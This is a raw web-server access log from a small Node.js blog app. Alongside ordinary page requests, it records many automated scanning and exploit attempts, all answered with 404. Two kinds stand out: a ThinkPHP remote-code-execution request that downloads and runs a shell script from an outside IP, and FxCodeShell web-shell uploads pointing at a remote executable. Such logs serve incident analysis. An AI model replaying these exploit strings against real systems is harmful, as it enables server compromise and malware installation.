
> blogger@0.0.0 start /home/bitnami/blogger2
> node ./bin/www

(node:27095) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
Mongoose connected to mongodb://localhost/blogger2
[0mGET /blog [32m200 [0m11.939 ms - 3768[0m
[0mGET /blog [36m304 [0m1.882 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.214 ms - -[0m
[0mGET /blog [36m304 [0m0.901 ms - -[0m
[0mGET /blog/blog-delete [36m304 [0m1.239 ms - -[0m
[0mGET /blog [36m304 [0m0.864 ms - -[0m
[0mGET /blog/blog-edit [36m304 [0m1.104 ms - -[0m
[0mGET / [36m304 [0m1.381 ms - -[0m

> blogger@0.0.0 start /home/bitnami/blogger2
> node ./bin/www

(node:27171) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
Mongoose connected to mongodb://localhost/blogger2
[0mGET / [36m304 [0m11.102 ms - -[0m
[0mGET /blog [36m304 [0m2.503 ms - -[0m
[0mGET /blog [36m304 [0m1.849 ms - -[0m

> blogger@0.0.0 start /home/bitnami/blogger2
> node ./bin/www

(node:27250) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
Mongoose connected to mongodb://localhost/blogger2
[0mGET /blog [32m200 [0m11.306 ms - 3768[0m
[0mGET /blog [36m304 [0m2.025 ms - -[0m
[0mGET /blog [36m304 [0m1.032 ms - -[0m
[0mGET /blog [36m304 [0m0.883 ms - -[0m
[0mGET /blog [36m304 [0m0.866 ms - -[0m
[0mGET /blog [36m304 [0m0.926 ms - -[0m
[0mGET /blog [36m304 [0m0.918 ms - -[0m
[0mGET /blog [36m304 [0m0.875 ms - -[0m
[0mGET /blog [36m304 [0m0.824 ms - -[0m
[0mGET /blog [36m304 [0m0.898 ms - -[0m
[0mGET /blog [36m304 [0m0.917 ms - -[0m
[0mGET /blog [36m304 [0m0.906 ms - -[0m
[0mGET /blog [36m304 [0m0.887 ms - -[0m
[0mGET /blog [36m304 [0m0.889 ms - -[0m
[0mGET /blog [36m304 [0m0.943 ms - -[0m
[0mGET /blog [36m304 [0m1.501 ms - -[0m
[0mGET /blog [36m304 [0m0.817 ms - -[0m
[0mGET /blog [36m304 [0m0.864 ms - -[0m
[0mGET /blog [36m304 [0m0.807 ms - -[0m
[0mGET /blog [36m304 [0m0.849 ms - -[0m
[0mGET /blog [36m304 [0m0.923 ms - -[0m
[0mGET /blog [36m304 [0m0.948 ms - -[0m
[0mGET /blog [36m304 [0m0.907 ms - -[0m
[0mGET /blog [36m304 [0m0.908 ms - -[0m
[0mGET /blog [36m304 [0m0.758 ms - -[0m
[0mGET /blog [36m304 [0m1.204 ms - -[0m
[0mGET /blog [36m304 [0m0.905 ms - -[0m
[0mGET /blog [36m304 [0m0.921 ms - -[0m
[0mGET /blog [36m304 [0m0.901 ms - -[0m
[0mGET /blog [36m304 [0m0.921 ms - -[0m
[0mGET /blog [36m304 [0m0.885 ms - -[0m
[0mGET /blog [36m304 [0m0.869 ms - -[0m
[0mGET /blog [36m304 [0m0.871 ms - -[0m
[0mGET /blog [36m304 [0m0.902 ms - -[0m
[0mGET /blog [36m304 [0m1.203 ms - -[0m
[0mGET /blog [36m304 [0m0.845 ms - -[0m
[0mGET /blog [36m304 [0m0.850 ms - -[0m
[0mGET /blog [36m304 [0m0.933 ms - -[0m
[0mGET /blog [36m304 [0m0.857 ms - -[0m
[0mGET /blog [36m304 [0m0.962 ms - -[0m
[0mGET /blog [36m304 [0m0.846 ms - -[0m
[0mGET /blog [36m304 [0m0.883 ms - -[0m
[0mGET /blog [36m304 [0m0.865 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m1.159 ms - -[0m
[0mGET / [36m304 [0m1.729 ms - -[0m
[0mGET /blog [36m304 [0m5.215 ms - -[0m
[0mGET /blog [36m304 [0m0.860 ms - -[0m
[0mGET / [36m304 [0m1.071 ms - -[0m
[0mGET / [32m200 [0m1.355 ms - 2148[0m
[0mGET / [32m200 [0m2.057 ms - 2148[0m
[0mGET / [32m200 [0m0.775 ms - 2148[0m
[0mGET http://www.proxylists.net/proxyjudge.php [33m404 [0m3.098 ms - 1482[0m
[0mGET / [32m200 [0m0.876 ms - 2148[0m
[0mGET / [32m200 [0m0.728 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m1.023 ms - 1482[0m
[0mGET /blog [32m200 [0m0.873 ms - 3768[0m
[0mGET /blog [36m304 [0m1.225 ms - -[0m
[0mGET /blog/addBlog [32m200 [0m1.000 ms - 1948[0m
[0mGET /blog [36m304 [0m0.861 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.795 ms - -[0m
[0mGET /blog [36m304 [0m0.871 ms - -[0m
[0mGET /blog/blog-delete [32m200 [0m1.046 ms - 1945[0m
[0mGET /blog/blog-edit [32m200 [0m1.076 ms - 1939[0m
[0mGET /upgrade_handle.php?cmd=getupgradinginfo [33m404 [0m0.852 ms - 1482[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.727 ms - 2148[0m
[0mGET / [36m304 [0m0.691 ms - -[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET / [32m200 [0m0.798 ms - 2148[0m
[0mGET / [32m200 [0m0.823 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.686 ms - 2148[0m
[0mGET / [32m200 [0m0.772 ms - 2148[0m
[0mGET /blog [32m200 [0m0.962 ms - 3768[0m
[0mGET /favicon.ico [33m404 [0m0.779 ms - 1482[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m0.803 ms - 2148[0m
[0mGET / [32m200 [0m0.832 ms - 2148[0m
[0mGET / [32m200 [0m0.756 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m0.816 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.805 ms - 2148[0m
[0mGET / [32m200 [0m0.833 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m0.695 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.723 ms - 2148[0m
[0mGET / [32m200 [0m1.318 ms - 2148[0m
[0mGET / [32m200 [0m0.819 ms - 2148[0m
[0mGET / [32m200 [0m0.744 ms - 2148[0m
[0mGET / [32m200 [0m0.737 ms - 2148[0m
[0mGET / [32m200 [0m0.807 ms - 2148[0m
[0mGET / [32m200 [0m1.415 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m0.831 ms - 2148[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.813 ms - 2148[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET / [32m200 [0m0.798 ms - 2148[0m
[0mGET / [32m200 [0m18.671 ms - 2148[0m
[0mGET / [32m200 [0m1.295 ms - 2148[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.818 ms - 2148[0m
[0mPOST /sdk [33m404 [0m3.485 ms - 1477[0m
[0mGET / [32m200 [0m0.722 ms - 2148[0m
[0mGET /nmaplowercheck1551197439 [33m404 [0m0.614 ms - 1482[0m
[0mGET /evox/about [33m404 [0m3.066 ms - 1482[0m
[0mGET / [32m200 [0m0.616 ms - 2148[0m
[0mGET /HNAP1 [33m404 [0m0.731 ms - 1482[0m
[0mGET / [32m200 [0m0.783 ms - 2148[0m
[0mGET /handle_load_config.php [33m404 [0m0.761 ms - 1482[0m
[0mGET / [32m200 [0m0.732 ms - 2148[0m
[0mGET / [32m200 [0m0.717 ms - 2148[0m
[0mGET / [32m200 [0m0.789 ms - 2148[0m
[0mGET / [32m200 [0m0.787 ms - 2148[0m
[0mGET / [32m200 [0m0.744 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.709 ms - 2148[0m
[0mGET / [32m200 [0m25.021 ms - 2148[0m
[0mGET / [32m200 [0m1.932 ms - 2148[0m
[0mGET http://54.252.131.155/reply.php?q=eyJpcCI6IjE4LjIyNC42Ny41MyIsInBvcnQiOiI4MCIsIm5vZG5zIjp0cnVlLCJ0eXBlIjoiV0VCIiwiaGFzaCI6IjkzYmE3NDQwNjU3ZDc1M2I2MmMxZGEwY2Y1ZWMzOTAwIn0%3D [33m404 [0m2.634 ms - 1482[0m
[0mPOST http://54.252.131.155/reply.php [33m404 [0m26.443 ms - 1477[0m
[0mPOST http://54.252.131.155/reply.php [33m404 [0m0.778 ms - 1477[0m
[0mGET / [32m200 [0m0.805 ms - 2148[0m
[0mGET / [32m200 [0m0.801 ms - 2148[0m
[0mGET / [32m200 [0m0.787 ms - 2148[0m
[0mGET / [32m200 [0m2.458 ms - 2148[0m
[0mGET / [32m200 [0m3.410 ms - 2148[0m
[0mGET / [32m200 [0m6.017 ms - 2148[0m
[0mGET / [32m200 [0m0.791 ms - 2148[0m
[0mGET / [32m200 [0m0.766 ms - 2148[0m
[0mGET / [32m200 [0m0.748 ms - 2148[0m
[0mGET / [32m200 [0m0.706 ms - 2148[0m
[0mGET / [32m200 [0m0.783 ms - 2148[0m
[0mGET / [32m200 [0m0.789 ms - 2148[0m
[0mGET / [32m200 [0m0.768 ms - 2148[0m
[0mGET / [32m200 [0m0.711 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m3.792 ms - 1482[0m
[0mGET / [32m200 [0m0.770 ms - 2148[0m
[0mGET / [32m200 [0m1.339 ms - 2148[0m
[0mGET / [32m200 [0m0.753 ms - 2148[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.713 ms - 2148[0m
[0mGET / [32m200 [0m0.693 ms - 2148[0m
[0mGET / [32m200 [0m0.875 ms - 2148[0m
[0mGET / [32m200 [0m0.824 ms - 2148[0m
[0mGET / [32m200 [0m1.370 ms - 2148[0m
[0mGET / [32m200 [0m0.793 ms - 2148[0m
[0mGET / [32m200 [0m0.715 ms - 2148[0m
[0mGET /robots.txt [33m404 [0m2.010 ms - 1482[0m
[0mGET /sitemap.xml [33m404 [0m0.775 ms - 1482[0m
[0mGET /.well-known/security.txt [33m404 [0m0.805 ms - 1482[0m
[0mGET /favicon.ico [33m404 [0m0.752 ms - 1482[0m
[0mGET / [32m200 [0m0.734 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.816 ms - 2148[0m
[0mGET /robots.txt [33m404 [0m0.757 ms - 1482[0m
[0mGET /sitemap.xml [33m404 [0m0.766 ms - 1482[0m
[0mGET /.well-known/security.txt [33m404 [0m0.789 ms - 1482[0m
[0mGET /favicon.ico [33m404 [0m0.756 ms - 1482[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.780 ms - 2148[0m
[0mGET / [32m200 [0m1.314 ms - 2148[0m
[0mGET /acadmin.php [33m404 [0m13.514 ms - 1482[0m
[0mGET / [32m200 [0m2.696 ms - 2148[0m
[0mGET / [32m200 [0m0.727 ms - 2148[0m
[0mGET / [32m200 [0m0.720 ms - 2148[0m
[0mGET / [32m200 [0m0.808 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.807 ms - 2148[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.708 ms - 2148[0m
[0mGET / [32m200 [0m0.728 ms - 2148[0m
[0mGET http://54.252.131.155/reply.php?q=eyJpcCI6IjE4LjIyNC42Ny41MyIsInBvcnQiOiI4MCIsIm5vZG5zIjp0cnVlLCJ0eXBlIjoiV0VCIiwiaGFzaCI6IjkzYmE3NDQwNjU3ZDc1M2I2MmMxZGEwY2Y1ZWMzOTAwIn0%3D [33m404 [0m0.799 ms - 1482[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET /v1/agent/self [33m404 [0m3.293 ms - 1482[0m
[0mGET / [32m200 [0m0.798 ms - 2148[0m
[0mGET / [32m200 [0m0.792 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET / [32m200 [0m0.743 ms - 2148[0m
[0mGET / [36m304 [0m0.821 ms - -[0m
[0mOPTIONS / [32m200 [0m5.662 ms - 8[0m
[0mGET / [32m200 [0m0.753 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mHEAD http://112.124.42.80:63435/ [32m200 [0m1.234 ms - 2148[0m
[0mGET / [32m200 [0m0.777 ms - 2148[0m
[0mGET / [32m200 [0m0.799 ms - 2148[0m
[0mGET / [32m200 [0m0.764 ms - 2148[0m
[0mGET / [32m200 [0m0.715 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://86.105.49.215/a.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a; [33m404 [0m0.690 ms - 1482[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m11.327 ms - 2148[0m
[0mGET / [32m200 [0m1.860 ms - 2148[0m
[0mGET / [32m200 [0m0.754 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET / [32m200 [0m0.812 ms - 2148[0m
[0mPUT /FxCodeShell.jsp%20 [33m404 [0m26.354 ms - 1477[0m
[0mPUT /FxCodeShell.jsp::$DATA [33m404 [0m0.639 ms - 1477[0m
[0mPUT /FxCodeShell.jsp/ [33m404 [0m0.677 ms - 1477[0m
[0mGET /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe [33m404 [0m0.765 ms - 1482[0m
[0mGET / [32m200 [0m0.654 ms - 2148[0m
[0mGET / [32m200 [0m0.789 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.768 ms - 1482[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.749 ms - 1482[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.720 ms - 1482[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.770 ms - 1482[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m3.204 ms - 1482[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.737 ms - 1482[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.803 ms - 2148[0m
[0mGET / [32m200 [0m1.319 ms - 2148[0m
[0mGET / [32m200 [0m0.773 ms - 2148[0m
[0mGET / [32m200 [0m0.761 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.780 ms - 2148[0m
[0mGET / [32m200 [0m0.720 ms - 2148[0m
[0mGET / [32m200 [0m0.794 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m0.749 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.749 ms - 1482[0m
[0mGET / [32m200 [0m0.763 ms - 2148[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET / [32m200 [0m0.723 ms - 2148[0m
[0mGET / [32m200 [0m0.718 ms - 2148[0m
[0mGET / [32m200 [0m0.763 ms - 2148[0m
[0mGET / [32m200 [0m0.945 ms - 2148[0m
[0mGET / [32m200 [0m0.794 ms - 2148[0m
[0mGET / [32m200 [0m0.764 ms - 2148[0m
[0mGET / [32m200 [0m1.372 ms - 2148[0m
[0mGET / [32m200 [0m0.782 ms - 2148[0m
[0mGET / [32m200 [0m0.775 ms - 2148[0m
[0mGET / [32m200 [0m0.739 ms - 2148[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET / [32m200 [0m0.766 ms - 2148[0m
[0mGET / [32m200 [0m0.787 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m0.695 ms - 2148[0m
[0mGET / [32m200 [0m0.770 ms - 2148[0m
[0mGET / [32m200 [0m5.267 ms - 2148[0m
[0mGET / [32m200 [0m0.780 ms - 2148[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.819 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m0.741 ms - 2148[0m
[0mGET / [32m200 [0m0.783 ms - 2148[0m
[0mGET / [32m200 [0m0.725 ms - 2148[0m
[0mGET / [32m200 [0m0.747 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m0.742 ms - 2148[0m
[0mGET / [32m200 [0m0.784 ms - 2148[0m
[0mGET / [32m200 [0m7.134 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m1.636 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.703 ms - 2148[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m9.103 ms - 1482[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m1.337 ms - 1482[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.700 ms - 1482[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.688 ms - 1482[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.783 ms - 1482[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.749 ms - 1482[0m
[0mGET / [32m200 [0m0.779 ms - 2148[0m
[0mGET //a2billing/customer/templates/default/footer.tpl [33m404 [0m0.710 ms - 1482[0m
[0mGET / [32m200 [0m0.712 ms - 2148[0m
[0mGET / [32m200 [0m0.737 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET / [32m200 [0m0.809 ms - 2148[0m
[0mGET //recordings/ [33m404 [0m0.804 ms - 1482[0m
[0mGET //vtigercrm/vtigerservice.php [33m404 [0m0.811 ms - 1482[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.669 ms - 2148[0m
[0mGET / [32m200 [0m0.763 ms - 2148[0m
[0mGET / [32m200 [0m0.792 ms - 2148[0m
[0mGET //admin/config.php [33m404 [0m0.713 ms - 1482[0m
[0mGET / [32m200 [0m6.045 ms - 2148[0m
[0mGET / [32m200 [0m0.754 ms - 2148[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m1.309 ms - 1477[0m
[0mGET / [32m200 [0m0.809 ms - 2148[0m
[0mGET / [32m200 [0m0.715 ms - 2148[0m
[0mGET / [32m200 [0m1.279 ms - 2148[0m
[0mGET / [32m200 [0m0.738 ms - 2148[0m
[0mGET / [32m200 [0m0.814 ms - 2148[0m
[0mGET / [32m200 [0m1.260 ms - 2148[0m
[0mGET //a2billing/customer/templates/default/footer.tpl [33m404 [0m0.764 ms - 1482[0m
[0mGET / [32m200 [0m0.754 ms - 2148[0m
[0mGET / [32m200 [0m0.716 ms - 2148[0m
[0mGET / [32m200 [0m24.961 ms - 2148[0m
[0mGET / [32m200 [0m0.743 ms - 2148[0m
[0mGET //recordings/ [33m404 [0m2.427 ms - 1482[0m
[0mGET / [32m200 [0m0.747 ms - 2148[0m
[0mGET / [32m200 [0m0.833 ms - 2148[0m
[0mGET //vtigercrm/vtigerservice.php [33m404 [0m0.722 ms - 1482[0m
[0mGET / [32m200 [0m0.781 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.756 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.756 ms - 2148[0m
[0mGET / [32m200 [0m0.703 ms - 2148[0m
[0mGET / [32m200 [0m0.740 ms - 2148[0m
[0mGET //admin/config.php [33m404 [0m0.832 ms - 1482[0m
[0mGET /acadmin.php [33m404 [0m0.699 ms - 1482[0m
[0mGET / [32m200 [0m0.807 ms - 2148[0m
[0mGET / [32m200 [0m1.293 ms - 2148[0m
[0mGET //about.php [33m404 [0m0.783 ms - 1482[0m
[0mGET / [32m200 [0m0.811 ms - 2148[0m
[0mGET / [32m200 [0m0.571 ms - 2148[0m
[0mGET /admin/assets/js/views/login.js [33m404 [0m1.696 ms - 1482[0m
[0mGET / [32m200 [0m0.747 ms - 2148[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET / [32m200 [0m0.777 ms - 2148[0m
[0mGET / [32m200 [0m0.740 ms - 2148[0m
[0mGET / [32m200 [0m0.779 ms - 2148[0m
[0mGET / [32m200 [0m0.773 ms - 2148[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m0.721 ms - 2148[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [36m304 [0m0.916 ms - -[0m
[0mGET / [32m200 [0m0.714 ms - 2148[0m
[0mGET / [32m200 [0m0.745 ms - 2148[0m
[0mGET / [32m200 [0m0.780 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mHEAD / [32m200 [0m0.754 ms - 2148[0m
[0mGET / [32m200 [0m3.520 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.737 ms - 2148[0m
[0mGET /struts2-rest-showcase/orders.xhtml [33m404 [0m3.153 ms - 1482[0m
[0mGET /index.action [33m404 [0m0.778 ms - 1482[0m
[0mGET /index.do [33m404 [0m0.734 ms - 1482[0m
[0mGET / [32m200 [0m0.729 ms - 2148[0m
[0mGET / [32m200 [0m0.702 ms - 2148[0m
[0mGET / [32m200 [0m1.271 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.747 ms - 1482[0m
[0mGET / [32m200 [0m0.886 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m1.850 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET /TP/public/index.php [33m404 [0m7.045 ms - 1482[0m
[0mGET /TP/index.php [33m404 [0m0.645 ms - 1482[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.731 ms - 1482[0m
[0mGET /html/public/index.php [33m404 [0m3.940 ms - 1482[0m
[0mGET /public/index.php [33m404 [0m0.768 ms - 1482[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.715 ms - 1482[0m
[0mGET /elrekt.php [33m404 [0m0.719 ms - 1482[0m
[0mGET /index.php [33m404 [0m0.712 ms - 1482[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.795 ms - 2148[0m
[0mGET / [32m200 [0m2.159 ms - 2148[0m
[0mGET / [32m200 [0m2.904 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m3.494 ms - 2148[0m
[0mGET / [32m200 [0m0.768 ms - 2148[0m
[0mGET / [32m200 [0m0.779 ms - 2148[0m
[0mGET / [32m200 [0m1.264 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET / [36m304 [0m0.756 ms - -[0m
[0mGET / [32m200 [0m0.800 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m0.771 ms - 2148[0m
[0mGET / [32m200 [0m0.737 ms - 2148[0m
[0mGET / [32m200 [0m0.790 ms - 2148[0m
[0mGET / [32m200 [0m0.704 ms - 2148[0m
[0mGET / [32m200 [0m0.792 ms - 2148[0m
[0mGET / [32m200 [0m0.774 ms - 2148[0m
[0mGET / [32m200 [0m0.724 ms - 2148[0m
[0mGET / [32m200 [0m0.780 ms - 2148[0m
[0mGET / [32m200 [0m0.704 ms - 2148[0m
[0mGET / [32m200 [0m0.787 ms - 2148[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET /7E7DAC0EE02BA994E9618802E09A2022.php [33m404 [0m0.776 ms - 1482[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.659 ms - 2148[0m
[0mGET / [32m200 [0m0.692 ms - 2148[0m
[0mGET / [32m200 [0m0.787 ms - 2148[0m
[0mGET / [32m200 [0m0.725 ms - 2148[0m
[0mGET / [32m200 [0m11.703 ms - 2148[0m
[0mGET / [32m200 [0m0.714 ms - 2148[0m
[0mGET / [32m200 [0m0.757 ms - 2148[0m
[0mGET / [32m200 [0m0.685 ms - 2148[0m
[0mGET / [32m200 [0m0.732 ms - 2148[0m
[0mGET / [32m200 [0m1.193 ms - 2148[0m
[0mGET / [32m200 [0m0.702 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://86.105.49.215/a.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a; [33m404 [0m1.431 ms - 1482[0m
[0mGET / [32m200 [0m0.684 ms - 2148[0m
[0mGET /robots.txt [33m404 [0m0.755 ms - 1482[0m
[0mGET /sitemap.xml [33m404 [0m0.784 ms - 1482[0m
[0mGET /.well-known/security.txt [33m404 [0m1.533 ms - 1482[0m
[0mGET /favicon.ico [33m404 [0m0.732 ms - 1482[0m
[0mGET / [32m200 [0m0.701 ms - 2148[0m
[0mGET / [32m200 [0m0.695 ms - 2148[0m
[0mGET / [32m200 [0m0.764 ms - 2148[0m
[0mGET / [32m200 [0m0.711 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.713 ms - 1482[0m
[0mGET / [32m200 [0m0.784 ms - 2148[0m
[0mGET / [32m200 [0m0.711 ms - 2148[0m
[0mGET / [32m200 [0m0.747 ms - 2148[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m0.771 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.802 ms - 1482[0m
[0mGET / [32m200 [0m0.761 ms - 2148[0m
[0mGET / [32m200 [0m0.748 ms - 2148[0m
[0mGET / [32m200 [0m0.800 ms - 2148[0m
